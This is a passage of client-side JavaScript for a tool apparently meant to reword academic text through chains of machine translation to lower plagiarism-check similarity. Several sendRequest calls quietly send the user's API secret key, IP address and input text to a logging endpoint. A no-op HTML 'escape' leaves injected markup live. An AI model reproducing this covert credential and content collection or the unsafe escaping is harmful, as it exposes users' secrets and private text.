        myToast.mutipleControl(
          'error',
          '翻译失败！',
          null,
          true,
          `你还未配置账号！</br><span class='text-muted'>如果账号配置出错，请休息一会再尝试~<br/>你也可以去查阅一下帮助，我已更新最新教程！<br/>解决不了的话加群反馈(QQ群:238223706)</span>`,
          () => {}
        )
        showCompareResDivFn(0)
      } else {
        var nTo = $('#zifu').text()
        if (nTo < 2000) {
          if (
            appid11 == secret().WtdKltf2 &&
            key11 == secret().zDQA3 &&
            localStorage.getItem('sTimes') >= 0
          ) {
            if (nTo < 500) {
              if (nTo >= 300) {
                setTimeout(() => {
                  myToast.normal('success', '正在翻译！', 2500)
                }, 2000)
                myToast.normal(
                  'warning',
                  '您输入的内容过长！</br>为了保证翻译降重质量，建议在300字以内~',
                  3000
                )
                foamTip1 = false
              } else {
                myToast.normal('success', '正在翻译！', 2500)
              }

              var transMethodsString = `
              1：${localStorage.getItem('selectValueZero')};
              2：${localStorage.getItem('selectValueOne')};
              3：${localStorage.getItem('selectValueTwo')};
              4：${localStorage.getItem('selectValueThree')};
              5：${localStorage.getItem('selectValueFour')};
              6：${localStorage.getItem('selectValueFive')};
              `
              if (transMethodsString == oldTrans) {
                sendRequest(
                  `${localStorage.getItem(
                    'sTimes'
                  )} \\ ${appid11} \\ 翻译并对比`,
                  `${key11} \\
                  errorTimes: ${errorTimes} \\
                  restartTimes: ${restartTimes} \\
                  IP 地址：${kehu_ip} \\
                  翻译内容：${to.val()} \\
                  翻译路线：未修改`,
                  2
                )
              } else {
                sendRequest(
                  `${localStorage.getItem(
                    'sTimes'
                  )} \\ ${appid11} \\ 翻译并对比`,
                  `${key11} \\
                  errorTimes: ${errorTimes} \\
                  restartTimes: ${restartTimes} \\
                  IP 地址：${kehu_ip} \\
                  翻译内容：${to.val()} \\
                  翻译路线： 
                  ${transMethodsString}`,
                  2
                )
              }
              //! Don't forget it!
              window.similarityArr = []
              translateMain(1, getCheckBoxVal())
              showCompareResDivFn(1)
              document.querySelector('.showcase').scrollIntoView() // 页面不刷新跳转
            } else {
              myToast.mutipleControl(
                'error',
                '翻译失败！',
                null,
                true,
                '检测到你输入的字数超过500字，请调整减少字数后重新输入再翻译。由于你是体验用户，我这边限制了字数。如需提高字数，请自行查阅帮助去配置！',
                () => {}
              )
              showCompareResDivFn(0)
            }
          } else {
            if (foamTip1 == true && nTo >= 300) {
              setTimeout(() => {
                myToast.normal('success', '正在翻译！', 2500)
              }, 2000)
              myToast.normal(
                'warning',
                '您输入的内容过长！</br>为了保证翻译降重质量，建议在300字以内~',
                3000
              )
              foamTip1 = false
            } else {
              myToast.normal('success', '正在翻译！', 2500)
            }

            var transMethodsString1 = `
            1：${localStorage.getItem('selectValueZero')};
            2：${localStorage.getItem('selectValueOne')};
            3：${localStorage.getItem('selectValueTwo')};
            4：${localStorage.getItem('selectValueThree')};
            5：${localStorage.getItem('selectValueFour')};
            6：${localStorage.getItem('selectValueFive')};
            `
            if (transMethodsString1 == oldTrans) {
              sendRequest(
                `${localStorage.getItem('sTimes')} \\ ${appid11} \\ 翻译并对比`,
                `${key11} \\
                errorTimes: ${errorTimes} \\
                restartTimes: ${restartTimes} \\
                IP 地址：${kehu_ip} \\
                翻译内容：${to.val()} \\
                翻译路线：未修改`,
                2
              )
            } else {
              sendRequest(
                `${localStorage.getItem('sTimes')} \\ ${appid11} \\ 翻译并对比`,
                `${key11} \\
                errorTimes: ${errorTimes} \\
                restartTimes: ${restartTimes} \\
                IP 地址：${kehu_ip} \\
                翻译内容：${to.val()} \\
                翻译路线： 
                ${transMethodsString1}`,
                2
              )
            }
            //! Don't forget it!
            window.similarityArr = []
            translateMain(1, getCheckBoxVal())
            showCompareResDivFn(1)
            document.querySelector('.showcase').scrollIntoView() // 页面不刷新跳转
          }
        } else {
          myToast.normal(
            'warning',
            '您输入的内容过长！</br>为了保证翻译降重质量，建议在300字以内~',
            4000
          )
          showCompareResDivFn(0)
        }
      }
    }
  }
  if (timer !== null) {
    clearTimeout(timer)
  }
  timer = setTimeout(() => {
    $('.tongji').detach()
    fn()
    timer = null
  }, 500)
})

var restartTimes = 0
$('.restart').on('click', function() {
  myToast.normal('success', '正在重试...', 2500)
  from.html('正在重试...')
  if (restartTimes <= 5) {
    sendRequest(
      localStorage.getItem('sTimes') + ' \\ ' + localStorage.getItem('appid1'),
      '正在重试...',
      3
    )
  }
  restartTimes++
  translateZeroFn()
})

$('.restart1').on('click', function() {
  myToast.normal('success', '正在重试...', 2500)
  from1.html('正在重试...')
  if (restartTimes <= 5) {
    sendRequest(
      localStorage.getItem('sTimes') + ' \\ ' + localStorage.getItem('appid1'),
      '正在重试...',
      3
    )
  }
  restartTimes++
  translateOneFn()
})

$('.restart2').on('click', function() {
  myToast.normal('success', '正在重试...', 2500)
  from2.html('正在重试...')
  if (restartTimes <= 5) {
    sendRequest(
      localStorage.getItem('sTimes') + ' \\ ' + localStorage.getItem('appid1'),
      '正在重试...',
      3
    )
  }
  restartTimes++
  translateTwoFn()
})

$('.restart3').on('click', function() {
  myToast.normal('success', '正在重试...', 2500)
  from3.html('正在重试...')
  if (restartTimes <= 5) {
    sendRequest(
      localStorage.getItem('sTimes') + ' \\ ' + localStorage.getItem('appid1'),
      '正在重试...',
      3
    )
  }
  restartTimes++
  translateThreeFn()
})

$('.restart4').on('click', function() {
  myToast.normal('success', '正在重试...', 2500)
  from4.html('正在重试...')
  if (restartTimes <= 5) {
    sendRequest(
      localStorage.getItem('sTimes') + ' \\ ' + localStorage.getItem('appid1'),
      '正在重试...',
      3
    )
  }
  restartTimes++
  translateFourFn()
})

$('.restart5').on('click', function() {
  myToast.normal('success', '正在重试...', 2500)
  from5.html('正在重试...')
  if (restartTimes <= 5) {
    sendRequest(
      localStorage.getItem('sTimes') + ' \\ ' + localStorage.getItem('appid1'),
      '正在重试...',
      3
    )
  }
  restartTimes++
  translateFiveFn()
})

function queryFormatFn(rs) {
  return String(rs).replace(/^[“]+/, '').replace(/[”]$/, '')
}

var showTip = 0

function translateFn(QUERY, FROM, TO) {
  return new Promise((resolve, reject) => {
    const salt = new Date().getTime()
    const str1 = appid + QUERY + salt + key
    const sign = MD5.main(str1)
    setTimeout(() => {
      $.ajax({
        url,
        type: 'get',
        // async: true,
        // 跨域
        dataType: 'jsonp',
        contentType: 'application/x-www-form-urlencoded; charset=utf-8',
        data: {
          q: QUERY,
          appid: appid,
          salt: salt,
          from: FROM,
          to: TO,
          sign: sign
        }
      }).done((data) => {
        if (data.error_code == '52003') {
          myToast.mutipleControl(
            'error',
            '翻译失败！',
            null,
            true,
            '账号配置出错，请重新配置...如果你保存成功了还显示这条提示，大概率是因为百度服务器那边抽风了，你可以先休息一会，等会再刷新重试...解决不了的话加群反馈作者(QQ群:238223706)',
            () => {}
          )
          if (showTip <= 4) {
            sendRequest(
              'showTip: ' +
                showTip +
                ' \\ ' +
                localStorage.getItem('sTimes') +
                ' \\ ' +
                localStorage.getItem('appid1'),
              data.error_code +
                '：' +
                '封装的翻译API && 账号配置出错，请重新配置... &&' +
                localStorage.getItem('key1'),
              1
            )
          }
          showTip++
        } else if (data.error_code == '54003') {
          myToast.normal(
            'warning',
            '你的API不是高级版，所以出现修改失败!',
            3000
          )
          reject(data.error_code)
        } else if (data.trans_result[0] != undefined) {
          resolve(data.trans_result[0].dst)
        }
      })
    }, 1500)
  })
}
// var showTip1 = 0;

// function youdaoTranslateFn(query, from, to) {
// 	return new Promise((resolve, reject) => {
// 		var salt = (new Date).getTime();
// 		var curtime = Math.round(new Date().getTime() / 1000);
// 		var str1 = ydAppKey + truncate(query) + salt + curtime + ydKey;
// 		var sign = CryptoJS.SHA256(str1).toString(CryptoJS.enc.Hex);
// 		setTimeout(() => {
// 			$.ajax({
// 				url: 'https://openapi.youdao.com/api',
// 				type: 'post',
// 				dataType: 'jsonp',
// 				data: {
// 					q: query,
// 					appKey: ydAppKey,
// 					salt: salt,
// 					from: from,
// 					to: to,
// 					sign: sign,
// 					signType: "v3",
// 					curtime,
// 				}
// 			}).done(data => {
// 				if (data.errorCode == "108") {
// 					showToast("账号配置出错，请重新配置...如果你保存成功了还显示这条提示，大概率是因为百度服务器那边抽风了，你可以先休息一会，等会再刷新重试...解决不了的话加群反馈作者(QQ群:238223706)", 3000);
// 					if (showTip1 <= 4) {
// 						sendRequest('showTip1: ' + showTip1 + ' \\ ' + localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("ydAppid"), data.error_code + "：" + "封装的yd翻译API && 账号配置出错，请重新配置... &&" + localStorage.getItem("ydAppid"), 1);
// 					}
// 					showTip1++;
// 				} else if (data.errorCode == "5411") {
// 					showToast("yd:由于你的API还未升级成高级版，所以出现了修改失败...解决不了的话加群反馈作者(QQ群:238223706)", 3000);
// 					reject(data.errorCode);
// 				} else if (data.translation[0] != undefined) {
// 					resolve(data.translation[0])
// 				}
// 			})
// 		}, 1500);

// 		function truncate(q) {
// 			var len = q.length;
// 			if (len <= 20) return q;
// 			return q.substring(0, 10) + len + q.substring(len - 10, len);
// 		}
// 	})
// }

var errorTimes = 0
// 存放相似度结果
function Res(index, similarity) {
  this.index = index
  this.similarity = similarity
}
// zh-en-zh
function translateZeroFn(fn) {
  var selectValueZero = JSON.parse(localStorage.getItem('selectValueZero'))
  translateFn(
    to.val(),
    select.options[selectValueZero[0]].value,
    select1.options[selectValueZero[1]].value
  ).then(
    (rs) => {
      translateFn(
        queryFormatFn(rs),
        select1.options[selectValueZero[1]].value,
        select2.options[selectValueZero[2]].value
      ).then(
        (rs) => {
          from.html(rs)
          from.css('color', 'black')
          //! Don't forget it!
          var similarityRes = allSimilarity(to.val(), rs)
          var res = new Res(0, similarityRes)
          similarityArr.push(res)
          from.after(
            "<p class='tongji text-muted'>共计：<b>" +
              tongji(rs) +
              " </b>字符&emsp;<span class='similarity'>预计相似度：<b>" +
              similarityRes +
              '</b></span></p>'
          )
          if (fn) {
            setTimeout(() => {
              compareMain('from')
            }, 1000)
          }
        },
        (err) => {
          if (err == '54003' || err == '') {
            from.html('修改失败，请稍后重试......')
            from.css('color', 'red')
            $('.restart').css('display', 'inline-block')
            if (errorTimes <= 5) {
              sendRequest(
                localStorage.getItem('sTimes') +
                  ' \\ ' +
                  localStorage.getItem('appid1'),
                'error-1:' + err,
                1
              )
            }
            errorTimes++
          }
        }
      )
    },
    (err) => {
      if (err == '54003' || err == '') {
        from.html('修改失败，请稍后重试......')
        from.css('color', 'red')
        $('.restart').css('display', 'inline-block')
        if (errorTimes <= 5) {
          sendRequest(
            localStorage.getItem('sTimes') +
              ' \\ ' +
              localStorage.getItem('appid1'),
            'error:' + err,
            1
          )
        }
        errorTimes++
      }
    }
  )
}

// zh-jp-zh
function translateOneFn(fn) {
  var selectValueOne = JSON.parse(localStorage.getItem('selectValueOne'))
  translateFn(
    to.val(),
    select3.options[selectValueOne[0]].value,
    select4.options[selectValueOne[1]].value
  ).then(
    (rs) => {
      translateFn(
        queryFormatFn(rs),
        select4.options[selectValueOne[1]].value,
        select5.options[selectValueOne[2]].value
      ).then(
        (rs) => {
          from1.html(rs)
          from1.css('color', 'black')
          //! Don't forget it!
          var similarityRes = allSimilarity(to.val(), rs)
          var res = new Res(1, similarityRes)
          similarityArr.push(res)
          from1.after(
            "<p class='tongji text-muted'>共计：<b>" +
              tongji(rs) +
              " </b>字符&emsp;<span class='similarity'>预计相似度：<b>" +
              similarityRes +
              '</b></span></p>'
          )
          if (fn) {
            setTimeout(() => {
              compareMain('from1')
            }, 1000)
          }
        },
        (err) => {
          if (err == '54003' || err == '') {
            from1.html('修改失败，请稍后重试......')
            from1.css('color', 'red')
            $('.restart1').css('display', 'inline-block')
            if (errorTimes <= 5) {
              sendRequest(
                localStorage.getItem('sTimes') +
                  ' \\ ' +
                  localStorage.getItem('appid1'),
                'error1-1:' + err,
                1
              )
            }
            errorTimes++
          }
        }
      )
    },
    (err) => {
      if (err == '54003' || err == '') {
        from1.html('修改失败，请稍后重试......')
        from1.css('color', 'red')
        $('.restart1').css('display', 'inline-block')
        if (errorTimes <= 5) {
          sendRequest(
            localStorage.getItem('sTimes') +
              ' \\ ' +
              localStorage.getItem('appid1'),
            'error1:' + err,
            1
          )
        }
        errorTimes++
      }
    }
  )
}

// zh-it-zh
function translateTwoFn(fn) {
  var selectValueTwo = JSON.parse(localStorage.getItem('selectValueTwo'))
  translateFn(
    to.val(),
    select6.options[selectValueTwo[0]].value,
    select7.options[selectValueTwo[1]].value
  ).then(
    (rs) => {
      translateFn(
        queryFormatFn(rs),
        select7.options[selectValueTwo[1]].value,
        select8.options[selectValueTwo[2]].value
      ).then(
        (rs) => {
          from2.html(rs)
          from2.css('color', 'black')
          //! Don't forget it!
          var similarityRes = allSimilarity(to.val(), rs)
          var res = new Res(2, similarityRes)
          similarityArr.push(res)
          from2.after(
            "<p class='tongji text-muted'>共计：<b>" +
              tongji(rs) +
              " </b>字符&emsp;<span class='similarity'>预计相似度：<b>" +
              similarityRes +
              '</b></span></p>'
          )
          if (fn) {
            setTimeout(() => {
              compareMain('from2')
            }, 1000)
          }
        },
        (err) => {
          if (err == '54003' || err == '') {
            from2.html('修改失败，请稍后重试......')
            from2.css('color', 'red')
            $('.restart2').css('display', 'inline-block')
            if (errorTimes <= 5) {
              sendRequest(
                localStorage.getItem('sTimes') +
                  ' \\ ' +
                  localStorage.getItem('appid1'),
                'error2-1:' + err,
                1
              )
            }
          }
        }
      )
    },
    (err) => {
      if (err == '54003' || err == '') {
        from2.html('修改失败，请稍后重试......')
        from2.css('color', 'red')
        $('.restart2').css('display', 'inline-block')
        if (errorTimes <= 5) {
          sendRequest(
            localStorage.getItem('sTimes') +
              ' \\ ' +
              localStorage.getItem('appid1'),
            'error2:' + err,
            1
          )
        }
        errorTimes++
      }
    }
  )
}

// zh-fra-en-pt-jp-zh 中 法 英 葡 日 中
function translateThreeFn(fn) {
  var selectValueThree = JSON.parse(localStorage.getItem('selectValueThree'))
  translateFn(
    to.val(),
    select9.options[selectValueThree[0]].value,
    select10.options[selectValueThree[1]].value
  ).then(
    (rs) => {
      translateFn(
        queryFormatFn(rs),
        select10.options[selectValueThree[1]].value,
        select11.options[selectValueThree[2]].value
      ).then(
        (rs) => {
          translateFn(
            queryFormatFn(rs),
            select11.options[selectValueThree[2]].value,
            select12.options[selectValueThree[3]].value
          ).then(
            (rs) => {
              translateFn(
                queryFormatFn(rs),
                select12.options[selectValueThree[3]].value,
                select13.options[selectValueThree[4]].value
              ).then(
                (rs) => {
                  translateFn(
                    queryFormatFn(rs),
                    select13.options[selectValueThree[4]].value,
                    select14.options[selectValueThree[5]].value
                  ).then(
                    (rs) => {
                      from3.html(rs)
                      from3.css('color', 'black')
                      //! Don't forget it!
                      var similarityRes = allSimilarity(to.val(), rs)
                      var res = new Res(3, similarityRes)
                      similarityArr.push(res)
                      from3.after(
                        "<p class='tongji text-muted'>共计：<b>" +
                          tongji(rs) +
                          " </b>字符&emsp;<span class='similarity'>预计相似度：<b>" +
                          similarityRes +
                          '</b></span></p>'
                      )
                      if (fn) {
                        setTimeout(() => {
                          compareMain('from3')
                        }, 1000)
                      }
                      var sArr = GFG_Fun(similarityArr)
                      for (var i = 0; i < sArr.length; i++) {
                        $('.isLow-' + sArr[i]).toggleClass('alert-success')
                        showToast(
                          '系统检测到最低的预估的相似度为' +
                            similarityArr[0].similarity +
                            '的翻译结果，请注意查看<button id="similarTargetBtn" onclick="similarTarget(' +
                            sArr[0] +
                            ')">点击跳转该条翻译结果</button>',
                          3000
                        )
                        $('.isLow-' + sArr[i]).toggleClass('scale-in-center')
                      }

                      function GFG_Fun(arr) {
                        arr.sort(function(a, b) {
                          var o1 = parseFloat(a.similarity.replace('%', ''))
                          var o2 = parseFloat(b.similarity.replace('%', ''))
                          var p1 = a.index
                          var p2 = b.index
                          if (o1 < o2) return -1
                          if (o1 > o2) return 1
                          if (p1 < p2) return -1
                          if (p1 > p2) return 1
                          return 0
                        })
                        similarityArr = arr
                        var nArr = []
                        for (let i = 0; i < arr.length - 1; i++) {
                          if (arr[0].similarity == arr[i].similarity) {
                            if (nArr.length == 0) {
                              nArr.push(arr[0].index)
                            }
                            if (arr[i].similarity == arr[i + 1].similarity) {
                              nArr.push(arr[i + 1].index)
                            }
                          }
                        }
                        return nArr
                      }
                    },
                    (err) => {
                      if (err == '54003' || err == '') {
                        from3.html('修改失败，请稍后重试......')
                        from3.css('color', 'red')
                        $('.restart3').css('display', 'inline-block')
                        if (errorTimes <= 5) {
                          sendRequest(
                            localStorage.getItem('sTimes') +
                              ' \\ ' +
                              localStorage.getItem('appid1'),
                            'error3-4:' + err,
                            1
                          )
                        }
                        errorTimes++
                      }
                    }
                  )
                },
                (err) => {
                  if (err == '54003' || err == '') {
                    from3.html('修改失败，请稍后重试......')
                    from3.css('color', 'red')
                    $('.restart3').css('display', 'inline-block')
                    if (errorTimes <= 5) {
                      sendRequest(
                        localStorage.getItem('sTimes') +
                          ' \\ ' +
                          localStorage.getItem('appid1'),
                        'error3-3:' + err,
                        1
                      )
                    }
                    errorTimes++
                  }
                }
              )
            },
            (err) => {
              if (err == '54003' || err == '') {
                from3.html('修改失败，请稍后重试......')
                from3.css('color', 'red')
                $('.restart3').css('display', 'inline-block')
                if (errorTimes <= 5) {
                  sendRequest(
                    localStorage.getItem('sTimes') +
                      ' \\ ' +
                      localStorage.getItem('appid1'),
                    'error3-2:' + err,
                    1
                  )
                }
                errorTimes++
              }
            }
          )
        },
        (err) => {
          if (err == '54003' || err == '') {
            from3.html('修改失败，请稍后重试......')
            from3.css('color', 'red')
            $('.restart3').css('display', 'inline-block')
            if (errorTimes <= 5) {
              sendRequest(
                localStorage.getItem('sTimes') +
                  ' \\ ' +
                  localStorage.getItem('appid1'),
                'error3-1:' + err,
                1
              )
            }
            errorTimes++
          }
        }
      )
    },
    (err) => {
      if (err == '54003' || err == '') {
        from3.html('修改失败，请稍后重试......')
        from3.css('color', 'red')
        $('.restart3').css('display', 'inline-block')
        if (errorTimes <= 5) {
          sendRequest(
            localStorage.getItem('sTimes') +
              ' \\ ' +
              localStorage.getItem('appid1'),
            'error3:' + err,
            1
          )
        }
        errorTimes++
      }
    }
  )
}

// zh - de - fra - zh
function translateFourFn(fn) {
  var selectValueFour = JSON.parse(localStorage.getItem('selectValueFour'))
  translateFn(
    to.val(),
    select15.options[selectValueFour[0]].value,
    select16.options[selectValueFour[1]].value
  ).then(
    (rs) => {
      translateFn(
        queryFormatFn(rs),
        select16.options[selectValueFour[1]].value,
        select17.options[selectValueFour[2]].value
      ).then(
        (rs) => {
          translateFn(
            queryFormatFn(rs),
            select17.options[selectValueFour[2]].value,
            select18.options[selectValueFour[3]].value
          ).then(
            (rs) => {
              from4.html(rs)
              from4.css('color', 'black')
              //! Don't forget it!
              var similarityRes = allSimilarity(to.val(), rs)
              var res = new Res(4, similarityRes)
              similarityArr.push(res)
              from4.after(
                "<p class='tongji text-muted'>共计：<b>" +
                  tongji(rs) +
                  " </b>字符&emsp;<span class='similarity'>预计相似度：<b>" +
                  similarityRes +
                  '</b></span></p>'
              )
              if (fn) {
                setTimeout(() => {
                  compareMain('from4')
                }, 1000)
              }
            },
            (err) => {
              if (err == '54003' || err == '') {
                from4.html('修改失败，请稍后重试......')
                from4.css('color', 'red')
                $('.restart4').css('display', 'inline-block')
                if (errorTimes <= 5) {
                  sendRequest(
                    localStorage.getItem('sTimes') +
                      ' \\ ' +
                      localStorage.getItem('appid1'),
                    'error4-2:' + err,
                    1
                  )
                }
                errorTimes++
              }
            }
          )
        },
        (err) => {
          if (err == '54003' || err == '') {
            from4.html('修改失败，请稍后重试......')
            from4.css('color', 'red')
            $('.restart4').css('display', 'inline-block')
            if (errorTimes <= 5) {
              sendRequest(
                localStorage.getItem('sTimes') +
                  ' \\ ' +
                  localStorage.getItem('appid1'),
                'error4-1:' + err,
                1
              )
            }
            errorTimes++
          }
        }
      )
    },
    (err) => {
      if (err == '54003' || err == '') {
        from4.html('修改失败，请稍后重试......')
        from4.css('color', 'red')
        $('.restart4').css('display', 'inline-block')
        if (errorTimes <= 5) {
          sendRequest(
            localStorage.getItem('sTimes') +
              ' \\ ' +
              localStorage.getItem('appid1'),
            'error4:' + err,
            1
          )
        }
        errorTimes++
      }
    }
  )
}

// zh-en-jp-kor-zh
function translateFiveFn(fn) {
  var selectValueFive = JSON.parse(localStorage.getItem('selectValueFive'))
  translateFn(
    to.val(),
    select19.options[selectValueFive[0]].value,
    select20.options[selectValueFive[1]].value
  ).then(
    (rs) => {
      translateFn(
        queryFormatFn(rs),
        select20.options[selectValueFive[1]].value,
        select21.options[selectValueFive[2]].value
      ).then(
        (rs) => {
          translateFn(
            queryFormatFn(rs),
            select21.options[selectValueFive[2]].value,
            select22.options[selectValueFive[3]].value
          ).then(
            (rs) => {
              translateFn(
                queryFormatFn(rs),
                select22.options[selectValueFive[3]].value,
                select23.options[selectValueFive[4]].value
              ).then(
                (rs) => {
                  from5.html(rs)
                  from5.css('color', 'black')
                  //! Don't forget it!
                  var similarityRes = allSimilarity(to.val(), rs)
                  var res = new Res(5, similarityRes)
                  similarityArr.push(res)
                  from5.after(
                    "<p class='tongji text-muted'>共计：<b>" +
                      tongji(rs) +
                      " </b>字符&emsp;<span class='similarity'>预计相似度：<b>" +
                      similarityRes +
                      '</b></span></p>'
                  )
                  if (fn) {
                    setTimeout(() => {
                      compareMain('from5')
                    }, 1000)
                  }
                },
                (err) => {
                  if (err == '54003' || err == '') {
                    from5.html('修改失败，请稍后重试......')
                    from5.css('color', 'red')
                    $('.restart5').css('display', 'inline-block')
                    if (errorTimes <= 5) {
                      sendRequest(
                        localStorage.getItem('sTimes') +
                          ' \\ ' +
                          localStorage.getItem('appid1'),
                        'error5-3:' + err,
                        1
                      )
                    }
                    errorTimes++
                  }
                }
              )
            },
            (err) => {
              if (err == '54003' || err == '') {
                from5.html('修改失败，请稍后重试......')
                from5.css('color', 'red')
                $('.restart5').css('display', 'inline-block')
                if (errorTimes <= 5) {
                  sendRequest(
                    localStorage.getItem('sTimes') +
                      ' \\ ' +
                      localStorage.getItem('appid1'),
                    'error5-2:' + err,
                    1
                  )
                }
                errorTimes++
              }
            }
          )
        },
        (err) => {
          if (err == '54003' || err == '') {
            from5.html('修改失败，请稍后重试......')
            from5.css('color', 'red')
            $('.restart5').css('display', 'inline-block')
            if (errorTimes <= 5) {
              sendRequest(
                localStorage.getItem('sTimes') +
                  ' \\ ' +
                  localStorage.getItem('appid1'),
                'error5-1:' + err,
                1
              )
            }
            errorTimes++
          }
        }
      )
    },
    (err) => {
      if (err == '54003' || err == '') {
        from5.html('修改失败，请稍后重试......')
        from5.css('color', 'red')
        $('.restart5').css('display', 'inline-block')
        if (errorTimes <= 5) {
          sendRequest(
            localStorage.getItem('sTimes') +
              ' \\ ' +
              localStorage.getItem('appid1'),
            'error5:' + err,
            1
          )
        }
        errorTimes++
      }
    }
  )
}

function translateMain(fn, tarArr) {
  window.isRunZero = false
  window.isRunOne = false
  window.isRunTwo = false
  window.isRunThree = false
  window.isRunFour = false
  window.isRunFive = false
  if (typeof tarArr != 'string') {
    for (let index = 0; index < tarArr.length; index++) {
      if (tarArr[index] == 0) {
        window.isRunZero = true
      } else if (tarArr[index] == 1) {
        window.isRunOne = true
      } else if (tarArr[index] == 2) {
        window.isRunTwo = true
      } else if (tarArr[index] == 3) {
        window.isRunThree = true
      } else if (tarArr[index] == 4) {
        window.isRunFour = true
      } else if (tarArr[index] == 5) {
        window.isRunFive = true
      }
    }
    setTimeout(
      () => {
        if (window.isRunFive) {
          translateFiveFn(fn)
        }
      },
      1000,
      setTimeout(
        () => {
          if (window.isRunFour) {
            translateFourFn(fn)
          }
        },
        1000,
        setTimeout(
          () => {
            if (window.isRunThree) {
              translateThreeFn(fn)
            }
          },
          1000,
          setTimeout(
            () => {
              if (window.isRunTwo) {
                translateTwoFn(fn)
              }
            },
            1000,
            setTimeout(
              () => {
                if (window.isRunOne) {
                  translateOneFn(fn)
                }
              },
              1000,
              setTimeout(() => {
                if (window.isRunZero) {
                  translateZeroFn(fn)
                }
              }, 1000)
            )
          )
        )
      )
    )
  } else {
    myToast.normal('error', '未选择翻译路线！', 3000)
  }
}

function compareMain(op) {
  if (
    from.text() !== '修改失败，请稍后重试......' &&
    from.text() !== '\n\t\t\t\t\t\t\t\t\t\t\t\t\t' &&
    op === 'from'
  ) {
    compareFn(compare, to, from)
  }
  if (
    from1.text() !== '修改失败，请稍后重试......' &&
    from1.text() !== '\n\t\t\t\t\t\t\t\t\t\t\t\t\t' &&
    op === 'from1'
  ) {
    compareFn(compare1, to, from1)
  }
  if (
    from2.text() !== '修改失败，请稍后重试......' &&
    from2.text() !== '\n\t\t\t\t\t\t\t\t\t\t\t\t\t' &&
    op === 'from2'
  ) {
    compareFn(compare2, to, from2)
  }
  if (
    from3.text() !== '修改失败，请稍后重试......' &&
    from3.text() !== '\n\t\t\t\t\t\t\t\t\t\t\t\t\t' &&
    op === 'from3'
  ) {
    compareFn(compare3, to, from3)
  }
  if (
    from4.text() !== '修改失败，请稍后重试......' &&
    from4.text() !== '\n\t\t\t\t\t\t\t\t\t\t\t\t\t' &&
    op === 'from4'
  ) {
    compareFn(compare4, to, from4)
  }
  if (
    from5.text() !== '修改失败，请稍后重试......' &&
    from5.text() !== '\n\t\t\t\t\t\t\t\t\t\t\t\t\t' &&
    op === 'from5'
  ) {
    compareFn(compare5, to, from5)
  }
}

function compareFn(target, originData, newData) {
  target.html(
    eq({
      value1: newData.text(),
      value2: originData.val()
    }).value2
  )
}

function showToast(msg, duration) {
  const fn = () => {
    duration = isNaN(duration) ? 5000 : duration
    var d = new Date()
    // // 获取年份
    // var years = d.getFullYear()
    // // 获取月份
    // var months = d.getMonth() + 1
    // // 获取日期
    // var dates = d.getDate()
    // // 获取小时
    // var hours = d.getHours()
    // // 获取分钟
    // var minutes = d.getMinutes()
    // // 获取秒钟
    // var seconds = d.getSeconds()
    // var nowTime = `${years}/${months}/${dates} ${hours}:${minutes}:${seconds}`
    var time = '刚刚'
    var m = document.createElement('div')
    var content = `
    <div id='toastContainer' class="position-fixed top-0 end-0  p-2" style="z-index: 1100">
      <div id="liveToast" class="toast" role="alert" aria-live="assertive" aria-atomic="true">
    	  <div class="toast-header">
    	    <i style="margin-right:0.15625rem;"class="bi bi-app-indicator"></i>
    	    <strong class="me-auto">论文翻译降重助手</strong>
    	    <small>${time}</small>
    	    <button type="button" class="btn-close" data-bs-dismiss="toast" aria-label="Close"></button>
      	</div>
    	  <div class="toast-body">
    	  	${msg}
      	</div>
      </div>
    </div>`
    document.body.appendChild(m)
    m.innerHTML = content
    var toastLiveExample = document.getElementById('liveToast')
    var toast = new bootstrap.Toast(toastLiveExample)
    toast.show()
    setTimeout(function() {
      var d = 0.5
      m.style.webkitTransition = `-webkit-transform ${d}s ease-in, opacity ${d}s ease-in`
      m.style.opacity = '0'
      setTimeout(function() {
        toast.hide()
        document.body.removeChild(m)
      }, d * 1000)
    }, duration)
  }
  var ss = document.getElementById('toastContainer')
  if (ss != null) {
    ss.remove()
    fn()
  } else {
    fn()
  }
}

function eq(op) {
  if (!op) {
    return op
  }
  if (!op.eq_min) {
    op.eq_min = 3
  }
  if (!op.eq_index) {
    op.eq_index = 5
  }
  if (!op.value1 || !op.value2) {
    return op
  }
  var ps = {
    v1_i: 0,
    v1_new_value: '',
    v2_i: 0,
    v2_new_value: ''
  }
  while (ps.v1_i < op.value1.length && ps.v2_i < op.value2.length) {
    if (op.value1[ps.v1_i] == op.value2[ps.v2_i]) {
      // ps.v1_new_value += op.value1[ps.v1_i].replace(/</g,"<").replace(">",">");
      ps.v2_new_value += op.value2[ps.v2_i].replace(/</g, '<').replace('>', '>')
      ps.v1_i += 1
      ps.v2_i += 1
      // 值2增加的部分
      if (ps.v1_i >= op.value1.length) {
        ps.v2_new_value +=
          "<del style='color:red'>" +
          op.value2.substr(ps.v2_i).replace(/</g, '<').replace('>', '>') +
          '</del>'
        break
      }
      // 值1删除的部分
      if (ps.v2_i >= op.value2.length) {
        // ps.v1_new_value += "<span style='" + op.value1_style + "'>值1多的" + op.value1.substr(ps.v1_i).replace(/</g,"<").replace(">",">") + "</span>";
        ps.v2_new_value +=
          "<span style='color:green'>" +
          op.value1.substr(ps.v1_i).replace(/</g, '<').replace('>', '>') +
          '</span>'
        break
      }
    } else {
      ps.v1_index = ps.v1_i + 1
      ps.v1_eq_length = 0
      ps.v1_eq_max = 0
      ps.v1_start = ps.v1_i + 1
      while (ps.v1_index < op.value1.length) {
        if (op.value1[ps.v1_index] == op.value2[ps.v2_i + ps.v1_eq_length]) {
          ps.v1_eq_length += 1
        } else if (ps.v1_eq_length > 0) {
          if (ps.v1_eq_max < ps.v1_eq_length) {
            ps.v1_eq_max = ps.v1_eq_length
            ps.v1_start = ps.v1_index - ps.v1_eq_length
          }
          ps.v1_eq_length = 0
          break // 只寻找最近的
        }
        ps.v1_index += 1
      }
      if (ps.v1_eq_max < ps.v1_eq_length) {
        ps.v1_eq_max = ps.v1_eq_length
        ps.v1_start = ps.v1_index - ps.v1_eq_length
      }

      ps.v2_index = ps.v2_i + 1
      ps.v2_eq_length = 0
      ps.v2_eq_max = 0
      ps.v2_start = ps.v2_i + 1
      while (ps.v2_index < op.value2.length) {
        if (op.value2[ps.v2_index] == op.value1[ps.v1_i + ps.v2_eq_length]) {
          ps.v2_eq_length += 1
        } else if (ps.v2_eq_length > 0) {
          if (ps.v2_eq_max < ps.v2_eq_length) {
            ps.v2_eq_max = ps.v2_eq_length
            ps.v2_start = ps.v2_index - ps.v2_eq_length
          }
          ps.v1_eq_length = 0
          break // 只寻找最近的
        }
        ps.v2_index += 1
      }
